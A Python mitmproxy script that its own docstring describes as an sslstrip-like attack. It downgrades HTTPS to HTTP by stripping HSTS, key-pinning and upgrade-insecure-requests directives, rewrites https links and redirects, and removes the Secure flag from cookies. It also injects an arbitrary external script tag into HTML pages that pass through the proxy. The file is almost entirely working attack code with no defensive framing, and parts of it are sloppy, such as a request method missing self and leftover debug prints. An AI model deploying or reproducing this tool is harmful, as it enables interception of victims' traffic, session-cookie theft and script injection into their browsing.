"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse, re, urllib

# set of SSL/TLS capable hosts
secure_hosts = set()

class Injector:
    def __init__(self, path):
        self.path = path

    def response(self, flow: http.HTTPFlow) -> None:

        flow.response.headers.pop('Strict-Transport-Security', None)
        flow.response.headers.pop('Public-Key-Pins', None)

        # strip links in response body
        flow.response.content = flow.response.content.replace(b'https://', b'http://')

        # strip meta tag upgrade-insecure-requests in response body
        csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
        flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

        # strip links in 'Location' header
        if flow.response.headers.get('Location', '').startswith('https://'):
            location = flow.response.headers['Location']
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        # strip upgrade-insecure-requests in Content-Security-Policy header
        if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
            csp = flow.response.headers['Content-Security-Policy']
            flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

        # strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)
        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            print(self.path)
            print(flow.response.headers["content-type"])
            if flow.response.headers["content-type"] == 'text/html':
                print(flow.response.headers["content-type"])
                script = html.new_tag(
                    "script",
                    src=self.path,
                    type='application/javascript')
                html.body.insert(0, script)
                flow.response.content = str(html).encode("utf8")
                print("Script injected.")

    def request(flow):
        flow.request.headers.pop('If-Modified-Since', None)
        flow.request.headers.pop('Cache-Control', None)

        # do not force https redirection
        flow.request.headers.pop('Upgrade-Insecure-Requests', None)

        # proxy connections to SSL-enabled hosts
        if flow.request.pretty_host in secure_hosts:
            flow.request.scheme = 'https'
            flow.request.port = 443

            # We need to update the request destination to whatever is specified in the host header:
            # Having no TLS Server Name Indication from the client and just an IP address as request.host
            # in transparent mode, TLS server name certificate validation would fail.
            flow.request.host = flow.request.pretty_host

def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)